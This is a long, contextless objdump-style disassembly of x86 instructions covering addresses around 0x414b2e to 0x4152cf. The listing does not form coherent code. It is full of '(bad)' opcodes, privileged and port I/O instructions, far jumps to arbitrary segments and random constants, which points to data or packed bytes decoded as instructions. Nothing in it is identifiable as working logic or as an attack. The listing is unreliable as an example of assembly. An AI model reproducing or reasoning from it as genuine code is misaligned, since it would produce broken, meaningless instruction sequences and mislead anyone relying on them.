  414b2e:	or     al,0x1d
  414b30:	xchg   esp,eax
  414b31:	xchg   esi,eax
  414b32:	stos   DWORD PTR es:[edi],eax
  414b33:	ins    BYTE PTR es:[edi],dx
  414b34:	xchg   ebx,eax
  414b35:	fcmovb st,st(3)
  414b37:	pop    esp
  414b38:	je     0x414b89
  414b3a:	pop    esp
  414b3b:	std    
  414b3c:	lds    eax,FWORD PTR [edx+eiz*4-0x44]
  414b40:	inc    ebx
  414b41:	mov    dh,0x37
  414b43:	xchg   esp,eax
  414b44:	daa    
  414b45:	loop   0x414ad8
  414b47:	inc    ecx
  414b48:	or     al,0x2f
  414b4a:	adc    eax,0x7b0db0b9
  414b4f:	mov    ah,0xfd
  414b51:	jbe    0x414b74
  414b53:	jmp    0x414b91
  414b55:	inc    edi
  414b56:	ss mov ah,0x1a
  414b59:	hlt    
  414b5a:	push   cs
  414b5b:	pop    ss
  414b5c:	int    0xdf
  414b5e:	sub    DWORD PTR [esp+ebp*1-0x4aa83222],ecx
  414b65:	mov    es,WORD PTR [ebp-0xc8abfc2]
  414b6b:	in     al,0xf5
  414b6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b6e:	dec    ebx
  414b6f:	or     cl,BYTE PTR [ecx-0x1b]
  414b72:	xor    ah,al
  414b74:	adc    DWORD PTR [edx-0x3a],0xffffffb9
  414b78:	jno    0x414b7d
  414b7a:	push   ebp
  414b7b:	pop    ds
  414b7c:	adc    ecx,eax
  414b7e:	xchg   BYTE PTR [ebp-0x52],cl
  414b81:	out    0x14,al
  414b83:	xchg   DWORD PTR [eax+eax*8-0x36],edi
  414b87:	inc    eax
  414b88:	push   0x19
  414b8a:	fsubr  QWORD PTR [eax]
  414b8c:	fidiv  WORD PTR [esi+0x70]
  414b8f:	inc    esp
  414b90:	mov    eax,0xb61145c
  414b95:	dec    ebp
  414b96:	jno    0x414b8f
  414b98:	fistp  DWORD PTR [esi]
  414b9a:	leave  
  414b9b:	arpl   WORD PTR ds:[ecx],di
  414b9e:	mov    ebx,0x7d41a50d
  414ba3:	pop    edx
  414ba4:	inc    esi
  414ba5:	jmp    0x414b32
  414ba7:	mov    WORD PTR [ecx+0x16],fs
  414baa:	into   
  414bab:	push   esi
  414bac:	gs call 0x3af9:0x4b3c88fc
  414bb4:	aad    0x9b
  414bb6:	sbb    DWORD PTR [ebp+eiz*4-0x5dedaee1],eax
  414bbd:	push   ss
  414bbe:	mov    edi,edi
  414bc0:	div    DWORD PTR [ecx]
  414bc2:	add    BYTE PTR [ecx+0x73],dl
  414bc5:	mov    esp,0x550a88d3
  414bca:	fcomp  st(3)
  414bcc:	xchg   ebp,eax
  414bcd:	jmp    0xc72e:0xd89dcd5b
  414bd4:	(bad)  [edi+0x695b9d7b]
  414bda:	jne    0x414bb8
  414bdc:	mov    al,ds:0xc96d2225
  414be1:	jno    0x414b85
  414be3:	and    al,0x2a
  414be5:	pop    ecx
  414be6:	pusha  
  414be7:	mov    bl,0x36
  414be9:	jnp    0x414c3f
  414beb:	ret    0x38a4
  414bee:	and    ah,cl
  414bf0:	xchg   DWORD PTR [ebp+0x5],eax
  414bf3:	popf   
  414bf4:	sahf   
  414bf5:	inc    esi
  414bf6:	jl     0x414c29
  414bf8:	jns    0x414c40
  414bfa:	aad    0x91
  414bfc:	ficomp DWORD PTR [eax-0x4318d612]
  414c02:	xchg   DWORD PTR [ebp+0x62],esi
  414c05:	lock inc eax
  414c07:	sbb    dh,ah
  414c09:	aad    0x23
  414c0b:	inc    ebp
  414c0c:	ja     0x414bfd
  414c0e:	push   0xffffff82
  414c10:	sbb    eax,0x7048d4e1
  414c15:	call   0x28e:0x671955fb
  414c1c:	mov    ebp,0xcd15865d
  414c21:	loopne 0x414ba7
  414c23:	add    al,0xe0
  414c25:	and    ebx,ebp
  414c27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c28:	xchg   ecx,eax
  414c29:	retf   0xa3cb
  414c2c:	and    al,0xca
  414c2e:	mov    eax,0xa29aee70
  414c33:	adc    eax,0x914870b0
  414c38:	and    BYTE PTR [ebp+0x5a],dh
  414c3b:	pop    es
  414c3c:	mov    BYTE PTR [ebx-0x68],bh
  414c3f:	fidiv  WORD PTR [edi]
  414c41:	and    eax,0xb2292db7
  414c46:	or     al,0x82
  414c48:	(bad)  [esi-0x2e]
  414c4b:	stc    
  414c4c:	xchg   BYTE PTR [ebx+eiz*4+0x47],ch
  414c50:	and    al,BYTE PTR [edx+0x12]
  414c53:	sahf   
  414c54:	or     eax,0x9bcbe30d
  414c59:	cs iret 
  414c5b:	push   edi
  414c5c:	xlat   BYTE PTR ds:[ebx]
  414c5d:	aas    
  414c5e:	xor    DWORD PTR [eax-0x6d],esp
  414c61:	and    dh,ah
  414c63:	push   0x5876134f
  414c68:	sbb    dh,ch
  414c6a:	ja     0x414cd5
  414c6c:	gs mov esp,0x29ca599a
  414c72:	rcl    DWORD PTR [esp+ebp*4-0x1b],cl
  414c76:	ror    esp,cl
  414c78:	or     eax,0x9c5a0044
  414c7d:	add    al,0xa2
  414c7f:	pop    esi
  414c80:	mov    al,ds:0xfe533d26
  414c85:	push   cs
  414c86:	mov    eax,ds:0xf4fefd6e
  414c8b:	aad    0xdb
  414c8d:	jne    0x414ce2
  414c8f:	sbb    esp,ecx
  414c91:	mov    dl,BYTE PTR [edx-0xbb4cac2]
  414c97:	(bad)  
  414c98:	jge    0x414c98
  414c9a:	pop    ecx
  414c9b:	push   ebp
  414c9c:	mov    ebp,0x31ce6310
  414ca1:	scas   al,BYTE PTR es:[edi]
  414ca2:	pop    ebp
  414ca3:	fcmovbe st,st(0)
  414ca5:	cwde   
  414ca6:	mov    ebx,0xd2100a20
  414cab:	pusha  
  414cac:	pop    ecx
  414cad:	mov    edi,0x2241b784
  414cb2:	cs or  cl,ah
  414cb5:	repnz cmp DWORD PTR [ebp+0x56],0x11
  414cba:	je     0x414d04
  414cbc:	jbe    0x414c5f
  414cbe:	dec    esp
  414cbf:	shl    BYTE PTR [esi-0x43cc080d],1
  414cc5:	cmp    ah,cl
  414cc7:	or     edi,DWORD PTR [eax+0x48]
  414cca:	mov    esi,0x839286c4
  414ccf:	mov    dh,0xdd
  414cd1:	inc    esp
  414cd2:	div    DWORD PTR ds:0x7259aa9f
  414cd8:	cmp    al,0x82
  414cda:	or     BYTE PTR [eax+0xc],dl
  414cdd:	shl    DWORD PTR [edx],0x99
  414ce0:	fucompp 
  414ce2:	pop    edi
  414ce3:	and    DWORD PTR [eax-0x17],ecx
  414ce6:	ins    DWORD PTR es:[edi],dx
  414ce7:	mov    bh,0xe6
  414ce9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cea:	mov    esp,0xe18c81fc
  414cef:	int3   
  414cf0:	inc    esi
  414cf1:	inc    eax
  414cf2:	into   
  414cf3:	(bad)  
  414cf4:	das    
  414cf5:	out    0x4d,eax
  414cf7:	adc    edx,ebp
  414cf9:	jl     0x414c85
  414cfb:	jb     0x414c83
  414cfd:	pop    ds
  414cfe:	fsubr  DWORD PTR [ebp+0x7]
  414d01:	and    BYTE PTR [eax+0x61],ch
  414d04:	lods   al,BYTE PTR ds:[esi]
  414d05:	loope  0x414d5a
  414d07:	sbb    eax,0x16d17317
  414d0c:	bt     DWORD PTR [ebx+0x335c1d08],0x41
  414d14:	jecxz  0x414ca4
  414d16:	lahf   
  414d17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d18:	xor    DWORD PTR [ebx+eax*1],edx
  414d1b:	test   al,0xd
  414d1d:	or     eax,0x2b95963a
  414d22:	and    ah,BYTE PTR [ebx]
  414d24:	fild   WORD PTR ds:0x4fca613f
  414d2a:	push   edi
  414d2b:	mov    bh,0x68
  414d2d:	inc    esp
  414d2e:	xchg   DWORD PTR [edi-0x498e5203],edi
  414d34:	xchg   ebx,eax
  414d36:	inc    edi
  414d37:	mov    ds:0x5702eb4b,eax
  414d3c:	aas    
  414d3d:	dec    esi
  414d3e:	mov    eax,0x731eca09
  414d43:	stos   DWORD PTR es:[edi],eax
  414d44:	loope  0x414d09
  414d46:	mov    esp,0xe1cdac0
  414d4b:	pop    esi
  414d4c:	sbb    DWORD PTR ds:0x7697d684,ecx
  414d52:	ds mov bh,0xa
  414d55:	mov    ch,ah
  414d57:	dec    edi
  414d58:	aam    0xb1
  414d5a:	pusha  
  414d5b:	sbb    al,0x73
  414d5d:	mov    edi,0x97e9f3c2
  414d62:	pushf  
  414d63:	inc    edi
  414d64:	mov    edi,0x924523a
  414d69:	sbb    ch,0x1a
  414d6c:	(bad)  
  414d6d:	pop    ds
  414d6e:	push   ebp
  414d6f:	mov    BYTE PTR [eax-0x37],bh
  414d72:	in     al,0xa9
  414d74:	out    dx,al
  414d75:	sar    DWORD PTR [ebx-0x20],cl
  414d78:	test   eax,0x665382a7
  414d7d:	add    esp,DWORD PTR [ebx]
  414d7f:	call   0xa2a6:0x6cf4a543
  414d86:	sub    ebp,DWORD PTR [edi]
  414d88:	sti    
  414d89:	inc    edi
  414d8a:	push   ecx
  414d8b:	call   0xa0b9:0x89452be3
  414d92:	and    al,0x55
  414d94:	out    dx,eax
  414d95:	mov    ds:0x1bb5fccb,al
  414d9a:	test   DWORD PTR [eax-0x5d],ebx
  414d9d:	sub    esp,DWORD PTR [esi]
  414d9f:	inc    ebp
  414da0:	mov    eax,0xfb4b9ce7
  414da5:	xor    ah,BYTE PTR [edx+ebx*4]
  414da8:	inc    esi
  414da9:	jbe    0x414d42
  414dab:	adc    ebx,DWORD PTR [edx]
  414dad:	hlt    
  414dae:	mov    ds:0xa5fcb9b3,eax
  414db3:	xor    edi,DWORD PTR [esi]
  414db5:	and    eax,0x83589515
  414dba:	lock cmp DWORD PTR [edi+0x360dfffb],ebx
  414dc1:	mov    edx,0x1b22c13d
  414dc6:	nop
  414dc7:	sbb    DWORD PTR [edi+eax*4],edx
  414dca:	pop    ebp
  414dcb:	clc    
  414dcc:	js     0x414e26
  414dce:	mov    esi,0x281f3fb
  414dd3:	ret    
  414dd4:	ins    BYTE PTR es:[edi],dx
  414dd5:	and    ebx,DWORD PTR [ecx+0x1857c8c6]
  414ddb:	in     al,dx
  414ddc:	add    ebx,DWORD PTR [eax+ebx*2-0xf676794]
  414de3:	xlat   BYTE PTR ds:[ebx]
  414de4:	shr    BYTE PTR [edx+ebp*2+0x88ba08],1
  414deb:	aad    0xf6
  414ded:	lea    ebx,[ebx+esi*1]
  414df0:	jbe    0x414d83
  414df2:	leave  
  414df3:	aad    0x7d
  414df5:	cmc    
  414df6:	stos   BYTE PTR es:[edi],al
  414df7:	and    bl,BYTE PTR [edi]
  414df9:	out    dx,eax
  414dfa:	leave  
  414dfb:	ins    BYTE PTR es:[edi],dx
  414dfc:	mov    bl,0xee
  414dfe:	arpl   WORD PTR [eax+0x3],ax
  414e01:	imul   ebx,eax,0x4e
  414e04:	mov    ebp,0x3a1c989e
  414e09:	jl     0x414db6
  414e0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e0d:	push   ds
  414e0e:	jmp    0x414e0f
  414e10:	or     edx,DWORD PTR [edx+0x7b]
  414e13:	pushf  
  414e14:	lds    ebx,FWORD PTR [ebx+edx*4+0x51]
  414e18:	mov    al,ds:0x105206a2
  414e1d:	fld    st(5)
  414e1f:	mov    esp,0xbba5b119
  414e24:	pop    ss
  414e25:	push   cs
  414e26:	push   esp
  414e28:	fldenv [esi]
  414e2a:	in     al,dx
  414e2b:	push   0x685b4346
  414e30:	mov    ebp,0x73543ea4
  414e35:	call   0x4d7ca012
  414e3a:	add    dh,BYTE PTR [edi]
  414e3c:	lock mov esi,esi
  414e3f:	jecxz  0x414e9b
  414e41:	fist   WORD PTR [eax]
  414e43:	mov    edi,0xc4746969
  414e48:	push   ebp
  414e49:	jp     0x414e08
  414e4b:	icebp  
  414e4c:	dec    edx
  414e4d:	jo     0x414e8a
  414e4f:	add    bl,dh
  414e51:	stos   DWORD PTR es:[edi],eax
  414e52:	sbb    ah,ah
  414e54:	scas   eax,DWORD PTR es:[edi]
  414e55:	popa   
  414e56:	jmp    0x414e34
  414e58:	sub    BYTE PTR [edx],ch
  414e5a:	inc    edx
  414e5b:	jns    0x414e67
  414e5d:	daa    
  414e5e:	outs   dx,DWORD PTR ds:[esi]
  414e5f:	mov    eax,ds:0x72c9d1fa
  414e64:	xchg   ah,ch
  414e66:	adc    eax,0x9e0c3d31
  414e6b:	(bad)  
  414e6c:	and    cl,BYTE PTR [ebp-0x27f3f890]
  414e72:	add    bl,BYTE PTR [edx]
  414e74:	or     al,BYTE PTR [eax]
  414e76:	mov    ds:0x2fcffbca,al
  414e7b:	dec    eax
  414e7c:	sbb    eax,0x2ffbb2fe
  414e81:	xor    bl,ch
  414e83:	xlat   BYTE PTR ds:[ebx]
  414e84:	xchg   esp,eax
  414e85:	jb     0x414e89
  414e87:	ds in  eax,dx
  414e89:	inc    ebp
  414e8a:	push   eax
  414e8b:	mov    ebp,0x372dc5fc
  414e90:	sub    bl,BYTE PTR [edi+0x25]
  414e93:	loop   0x414ee7
  414e95:	test   DWORD PTR [edi],esi
  414e97:	(bad)  [esi]
  414e99:	dec    ecx
  414e9a:	or     ebx,ecx
  414e9c:	dec    esi
  414e9d:	lea    esp,[eax+0x7230be4f]
  414ea3:	adc    BYTE PTR [ebp-0x4e],ah
  414ea6:	dec    esi
  414ea7:	push   ebp
  414ea8:	jno    0x414e8b
  414eaa:	inc    ebp
  414eab:	xor    BYTE PTR [eax-0x2b],al
  414eae:	mov    bl,0x11
  414eb0:	xor    BYTE PTR [esi],al
  414eb2:	shl    BYTE PTR [esi],0x8d
  414eb5:	pop    edx
  414eb6:	(bad)  
  414eb7:	sar    DWORD PTR [esp+ecx*8+0x7f69e2c1],1
  414ebe:	daa    
  414ebf:	(bad)  
  414ec0:	adc    BYTE PTR [ebx],cl
  414ec2:	sbb    eax,0x19ef1116
  414ec7:	pop    ecx
  414ec8:	stos   DWORD PTR es:[edi],eax
  414ec9:	xchg   ebp,eax
  414eca:	xchg   ecx,eax
  414ecb:	push   esi
  414ecc:	add    al,0x92
  414ece:	and    DWORD PTR [ecx+0x5b67a196],edi
  414ed4:	push   ebx
  414ed5:	rcl    BYTE PTR [ebx-0x6c],1
  414ed8:	jbe    0x414ea0
  414eda:	(bad)  
  414edb:	jo     0x414e96
  414edd:	jl     0x414f47
  414edf:	adc    dl,BYTE PTR [edx+0x27dc204]
  414ee5:	popf   
  414ee6:	push   ds
  414ee7:	fbstp  TBYTE PTR [edx]
  414ee9:	cmc    
  414eea:	dec    ebx
  414eeb:	dec    ebx
  414eec:	loope  0x414f2f
  414eee:	adc    cl,al
  414ef0:	arpl   WORD PTR [ebx-0x79],sp
  414ef3:	pop    ds
  414ef4:	xchg   esi,eax
  414ef5:	pop    ecx
  414ef6:	dec    ebx
  414ef7:	lods   al,BYTE PTR ds:[esi]
  414ef8:	jno    0x414eb7
  414efa:	jle    0x414ebe
  414efc:	aaa    
  414efd:	inc    ecx
  414efe:	data16 fidivr WORD PTR [ecx-0x3e]
  414f02:	jnp    0x414ea8
  414f04:	in     eax,dx
  414f05:	add    eax,0x45a576a0
  414f0a:	popf   
  414f0b:	push   ss
  414f0c:	adc    cl,al
  414f0e:	fsub   DWORD PTR [ebp+0x7c1df28c]
  414f14:	shl    DWORD PTR [ebp-0x3384b9cc],cl
  414f1a:	cmp    DWORD PTR [edi-0x308d9f1e],0x8f485e1e
  414f24:	jecxz  0x414ed1
  414f26:	cmc    
  414f27:	jecxz  0x414ec5
  414f29:	cmp    eax,0x1df502a6
  414f2e:	cld    
  414f2f:	cmc    
  414f30:	xor    al,0x44
  414f32:	jae    0x414f11
  414f34:	mov    esp,esp
  414f36:	loop   0x414ed7
  414f38:	call   0xb45b5699
  414f3d:	outs   dx,DWORD PTR ds:[esi]
  414f3e:	mov    edi,0x74841de5
  414f43:	sub    esi,DWORD PTR ds:0x7c29f6b6
  414f49:	fist   DWORD PTR [ebp+ebx*4-0x67]
  414f4d:	jno    0x414fb1
  414f4f:	pop    ds
  414f50:	scas   eax,DWORD PTR es:[edi]
  414f51:	jp     0x414f5c
  414f53:	pushf  
  414f54:	clc    
  414f55:	loop   0x414f98
  414f57:	jg     0x414f29
  414f59:	inc    esi
  414f5a:	dec    esp
  414f5b:	jmp    0x414f84
  414f5d:	(bad)  
  414f5e:	cmp    al,0x34
  414f60:	daa    
  414f61:	jne    0x414f36
  414f63:	sub    edi,esi
  414f65:	inc    ebx
  414f66:	sbb    ecx,DWORD PTR [edi+0x6b]
  414f69:	jl     0x414fe0
  414f6b:	retf   0xc359
  414f6e:	push   edx
  414f6f:	das    
  414f70:	je     0x414ef9
  414f72:	fcomip st,st(2)
  414f74:	lock scas al,BYTE PTR es:[edi]
  414f76:	popa   
  414f77:	adc    BYTE PTR [ebp+0x4e90ac53],al
  414f7d:	cmp    ecx,DWORD PTR [ecx+0x62dae102]
  414f83:	sub    esi,DWORD PTR [edx-0x6fd1de94]
  414f89:	das    
  414f8a:	jle    0xa9adb288
  414f90:	(bad)  
  414f91:	(bad)  
  414f92:	mov    eax,0x83dd0688
  414f97:	outs   dx,BYTE PTR ds:[esi]
  414f98:	aam    0xeb
  414f9a:	fst    QWORD PTR [ebx-0x63]
  414f9d:	stos   DWORD PTR es:[edi],eax
  414f9e:	sub    al,0xbf
  414fa0:	mov    al,0xfc
  414fa2:	or     eax,DWORD PTR [ecx+edx*8+0x20]
  414fa6:	xchg   ecx,eax
  414fa7:	(bad)  
  414fa8:	mov    es,ebp
  414faa:	aas    
  414fab:	jns    0x414f37
  414fad:	jno    0x414f9f
  414faf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fb0:	sbb    DWORD PTR [eax-0x1c],esp
  414fb3:	mov    cl,0x26
  414fb5:	shl    esp,1
  414fb7:	aas    
  414fb8:	push   ebp
  414fb9:	jb     0x415023
  414fbb:	push   ds
  414fbc:	mov    ecx,0x652183b2
  414fc1:	fidivr DWORD PTR es:[edx-0x28efe6c5]
  414fc8:	adc    al,0x97
  414fca:	xchg   BYTE PTR [esi],dl
  414fcc:	jae    0x41503b
  414fce:	xor    BYTE PTR [ecx],bl
  414fd0:	outs   dx,DWORD PTR ds:[esi]
  414fd1:	pop    esp
  414fd2:	add    esi,DWORD PTR [esi]
  414fd4:	jno    0x415020
  414fd6:	jmp    0xef1ddbc4
  414fdb:	jp     0x415034
  414fdd:	add    edi,0x59
  414fe0:	push   0x7e
  414fe2:	xchg   esi,eax
  414fe3:	mov    esi,0xaacd5ecc
  414fe8:	(bad)  
  414fe9:	xchg   edi,eax
  414fea:	dec    edi
  414feb:	push   eax
  414fec:	mov    eax,0x528e5471
  414ff1:	ins    BYTE PTR es:[edi],dx
  414ff2:	jmp    0x414fe5
  414ff4:	ins    DWORD PTR es:[edi],dx
  414ff5:	(bad)  
  414ff7:	cld    
  414ff8:	(bad)  
  414ff9:	loope  0x415040
  414ffb:	retf   
  414ffc:	adc    eax,0x96500d03
  415001:	mov    ds,WORD PTR [edx+0x10d2cf4b]
  415007:	repnz loop 0x415033
  41500a:	xor    BYTE PTR [edx-0x2d9db213],al
  415010:	xchg   edi,eax
  415011:	in     eax,0xd1
  415013:	test   al,0xb5
  415015:	cmp    eax,0x1cb797f5
  41501a:	sub    DWORD PTR [eax+0x1275fcbf],edi
  415020:	jmp    0xf8a7:0xbdecd4fd
  415027:	ret    0x574f
  41502a:	mov    fs,ebp
  41502c:	dec    esp
  41502d:	scas   al,BYTE PTR es:[edi]
  41502e:	dec    eax
  41502f:	inc    ebp
  415030:	add    ebx,edi
  415032:	dec    ebx
  415033:	ins    BYTE PTR es:[edi],dx
  415034:	cmp    ebx,edx
  415036:	imul   eax,DWORD PTR [edi+esi*1],0xffffffdc
  41503a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41503b:	ins    DWORD PTR es:[edi],dx
  41503c:	sbb    ah,bl
  41503e:	inc    ebp
  41503f:	pop    esi
  415040:	pusha  
  415041:	mov    esp,0x3521dfa5
  415046:	jne    0x414fd6
  415048:	jne    0x41506f
  41504a:	jle    0x4150c1
  41504c:	fwait
  41504d:	xor    edi,edx
  41504f:	rol    DWORD PTR [esi+edx*2-0x6a],cl
  415053:	dec    ecx
  415054:	outs   dx,DWORD PTR ds:[esi]
  415055:	scas   eax,DWORD PTR es:[edi]
  415056:	push   0xe65a6ff3
  41505b:	sti    
  41505c:	xor    esi,esp
  41505e:	seta   BYTE PTR [esi]
  415061:	cs push esi
  415063:	mov    ebp,0xfba82998
  415068:	clc    
  415069:	xchg   edx,eax
  41506a:	mov    ah,BYTE PTR [edx]
  41506c:	aam    0x5a
  41506e:	aad    0x3b
  415070:	pop    edi
  415071:	call   0xc9a3fe79
  415076:	sub    al,ch
  415078:	loop   0x41502f
  41507a:	retf   
  41507b:	scas   eax,DWORD PTR es:[edi]
  41507c:	rep outs dx,BYTE PTR ds:[esi]
  41507e:	inc    edi
  41507f:	rcl    DWORD PTR [ecx+0x6c],1
  415082:	leave  
  415083:	cmp    DWORD PTR ds:0x63d641f2,esi
  415089:	cmp    al,0x59
  41508b:	pop    esp
  41508c:	dec    eax
  41508d:	push   esp
  41508e:	mov    ds:0xa0c4b356,al
  415093:	ja     0x4150e3
  415095:	cmp    eax,ecx
  415097:	dec    esi
  415098:	cmp    dl,BYTE PTR [edi]
  41509a:	iret   
  41509b:	pop    eax
  41509c:	pushf  
  41509d:	test   eax,0x6cb1902e
  4150a2:	(bad)  
  4150a3:	fcmovnu st,st(7)
  4150a5:	(bad)  
  4150a6:	dec    eax
  4150a7:	arpl   WORD PTR [edx],dx
  4150a9:	out    dx,eax
  4150aa:	mov    ebx,0xba04315a
  4150af:	fistp  WORD PTR [ebx-0x94b19a5]
  4150b5:	shrd   DWORD PTR ds:0x6bc253a1,edi,0xf
  4150bd:	adc    esi,DWORD PTR [ebx+0x1d]
  4150c0:	or     BYTE PTR [ebx-0x16],dl
  4150c3:	jns    0x415092
  4150c5:	mov    esp,0xe9e6cd15
  4150ca:	fwait
  4150cb:	aaa    
  4150cc:	xchg   edi,eax
  4150cd:	pop    edi
  4150ce:	push   edx
  4150cf:	or     eax,0xa844c502
  4150d4:	jmp    0xc48a5796
  4150d9:	xor    ecx,DWORD PTR [edi]
  4150db:	or     ah,BYTE PTR [ebp-0x27e48e27]
  4150e1:	dec    eax
  4150e2:	fiadd  WORD PTR [eax]
  4150e4:	xchg   ecx,eax
  4150e5:	bound  edx,QWORD PTR [edi]
  4150e7:	push   esi
  4150e8:	push   esp
  4150e9:	(bad)  
  4150ea:	pop    ebp
  4150eb:	mov    al,0xee
  4150ed:	mov    esp,0x44f4b4ef
  4150f2:	pop    ss
  4150f3:	jnp    0x4150a9
  4150f5:	adc    al,0xdd
  4150f7:	add    al,0x87
  4150f9:	dec    esp
  4150fa:	xor    esi,ebp
  4150fc:	bound  esi,QWORD PTR [ebx-0x3f8905a9]
  415102:	cmp    eax,0xce4dd23e
  415107:	mov    al,0x53
  415109:	cli    
  41510a:	outs   dx,DWORD PTR ds:[esi]
  41510b:	xchg   ecx,eax
  41510c:	into   
  41510d:	add    DWORD PTR [eax],0xfffffff6
  415110:	je     0x41517a
  415112:	bound  ebx,QWORD PTR [eax-0x2c313d3d]
  415118:	xor    DWORD PTR [eax+0xb],0xb06d4794
  41511f:	fistp  DWORD PTR [edi]
  415121:	cwde   
  415122:	enter  0x881,0x6f
  415126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415127:	pop    esp
  415128:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415129:	add    BYTE PTR [edx-0x599ec4f4],dh
  41512f:	inc    esp
  415130:	fisttp DWORD PTR [edi+0x8]
  415133:	retf   0x60c9
  415136:	dec    ebp
  415137:	jo     0x41510e
  415139:	lahf   
  41513a:	nop
  41513b:	xchg   ecx,eax
  41513c:	jne    0x4151a3
  41513e:	out    dx,eax
  41513f:	push   0x93ff5bf7
  415144:	test   BYTE PTR [edi+0x4c690001],cl
  41514a:	hlt    
  41514b:	fild   WORD PTR [edx-0x11]
  41514e:	gs stc 
  415150:	or     al,0xe7
  415152:	(bad)  
  415155:	mov    DWORD PTR [edi],0x7f7db72e
  41515b:	and    BYTE PTR [esp+ebx*4],0xbb
  41515f:	sub    al,0x47
  415161:	mov    ds:0xb72c6c5b,al
  415166:	push   edi
  415167:	mov    ecx,0xfe2506c7
  41516c:	inc    edx
  41516d:	ds jo  0x415187
  415170:	jmp    0xfe860914
  415175:	paddq  mm0,mm5
  415178:	push   cs
  415179:	pop    edx
  41517a:	adc    esp,esi
  41517c:	sub    ecx,DWORD PTR [bx-0x4f]
  415180:	mov    ds:0x1df9f268,eax
  415185:	mov    edi,0xad832e0a
  41518a:	mov    al,ds:0xeee876af
  41518f:	or     DWORD PTR [ebx-0x29a38696],0xffffff95
  415196:	xchg   ebp,eax
  415197:	mov    edx,0xae6bfc6f
  41519c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41519d:	mov    DWORD PTR [ebx-0x6f],edx
  4151a0:	ficomp WORD PTR [ebp+0x24]
  4151a3:	pop    ebx
  4151a4:	test   BYTE PTR [eax],al
  4151a6:	(bad)  
  4151a8:	daa    
  4151a9:	jge    0x41521f
  4151ab:	or     edi,DWORD PTR [edx-0x35]
  4151ae:	mov    ebx,0xc53906e6
  4151b3:	pushf  
  4151b4:	outs   dx,DWORD PTR ds:[esi]
  4151b5:	push   cs
  4151b6:	dec    ebx
  4151b7:	xor    eax,0xd0f78184
  4151bc:	(bad)  
  4151bd:	cld    
  4151be:	mov    WORD PTR [eax],gs
  4151c0:	inc    ebp
  4151c1:	sahf   
  4151c2:	cmp    al,0x63
  4151c4:	jo     0x4151c4
  4151c6:	or     eax,edx
  4151c8:	push   cs
  4151c9:	and    bl,BYTE PTR [eax-0x3e7a296c]
  4151cf:	push   ecx
  4151d0:	loope  0x415247
  4151d2:	out    dx,al
  4151d3:	mov    ecx,0xbe350ede
  4151d8:	adc    DWORD PTR [edx+0x7aff5483],0x2d
  4151df:	hlt    
  4151e0:	int3   
  4151e1:	shl    BYTE PTR [ebp+0x23],0x51
  4151e5:	test   ecx,ebp
  4151e7:	lahf   
  4151e8:	sar    BYTE PTR [edx-0x54],0xcf
  4151ec:	leave  
  4151ed:	jecxz  0x415216
  4151ef:	int3   
  4151f0:	push   edx
  4151f1:	and    DWORD PTR [edx],edi
  4151f3:	loopne 0x4151ca
  4151f5:	retf   0x10e7
  4151f8:	xchg   esi,eax
  4151f9:	stos   DWORD PTR es:[edi],eax
  4151fa:	and    eax,0xf458d6f1
  4151ff:	sub    ebx,esi
  415201:	and    edi,DWORD PTR [edi+0xb]
  415204:	shr    ah,cl
  415206:	adc    al,dl
  415208:	fst    st(0)
  41520a:	call   0xcc084a7e
  41520f:	mov    bl,0x5b
  415211:	out    dx,al
  415212:	adc    eax,0xae16e701
  415217:	mov    ds:0x6c824831,eax
  41521c:	retf   0x52dc
  41521f:	mov    dl,0x77
  415221:	fwait
  415222:	ins    BYTE PTR es:[edi],dx
  415223:	mov    edi,0x3c32df9d
  415228:	pusha  
  415229:	adc    eax,0x60bb4efd
  41522e:	repz iret 
  415230:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415231:	mov    al,0x68
  415233:	xor    cl,BYTE PTR [edx]
  415235:	inc    edi
  415236:	fldcw  WORD PTR [esi+0x53c12b26]
  41523c:	and    esp,edi
  41523e:	cld    
  41523f:	call   0xea1a:0xad7aa244
  415246:	ror    DWORD PTR ds:0xc267dcab,0xbf
  41524d:	or     dh,BYTE PTR [edx-0x20]
  415250:	pop    edx
  415251:	mov    edx,0x3ce990f4
  415256:	or     BYTE PTR [edx+0x74],bh
  415259:	add    bl,cl
  41525b:	lahf   
  41525c:	repz mov edx,0xa5ab74d0
  415262:	push   ecx
  415263:	sbb    ecx,DWORD PTR [ecx+ebp*2-0x7e]
  415267:	cli    
  415268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415269:	retf   
  41526a:	jne    0x415216
  41526c:	adc    edi,edx
  41526e:	mov    WORD PTR [esp+ebp*8-0x788fa06c],?
  415275:	inc    esi
  415276:	dec    edi
  415277:	das    
  415278:	es out dx,eax
  41527a:	sub    ecx,DWORD PTR [ebx+ebp*4-0x1e36ca29]
  415281:	dec    ecx
  415282:	outs   dx,BYTE PTR ds:[esi]
  415283:	es jne 0x415272
  415286:	ins    BYTE PTR es:[edi],dx
  415287:	cmp    edx,DWORD PTR [ebp+0x1e]
  41528a:	repnz stc 
  41528c:	mov    ds:0xedc234ad,eax
  415291:	sahf   
  415292:	test   BYTE PTR [esi+0x7a],0x50
  415296:	int    0xbd
  415298:	sub    esi,esp
  41529a:	fimul  WORD PTR [ecx]
  41529c:	dec    ebx
  41529d:	mov    cl,0xca
  41529f:	gs jge 0x415261
  4152a2:	sbb    DWORD PTR [ebx+eax*1],ebp
  4152a5:	pop    esp
  4152a6:	jp     0x415230
  4152a8:	fisttp DWORD PTR [esi-0x12]
  4152ab:	aad    0x51
  4152ad:	out    0x7,eax
  4152af:	and    DWORD PTR [esi+0x4117c1d3],esi
  4152b5:	scas   al,BYTE PTR es:[edi]
  4152b6:	aam    0xd
  4152b8:	into   
  4152b9:	stc    
  4152ba:	or     eax,0x9b0e3b93
  4152c0:	stc    
  4152c1:	sbb    eax,0x26bea806
  4152c6:	test   BYTE PTR [eax],dh
  4152c8:	out    dx,al
  4152c9:	fiadd  WORD PTR [ebp-0x6f44162c]
  4152cf:	mov    esp,0x332c8506
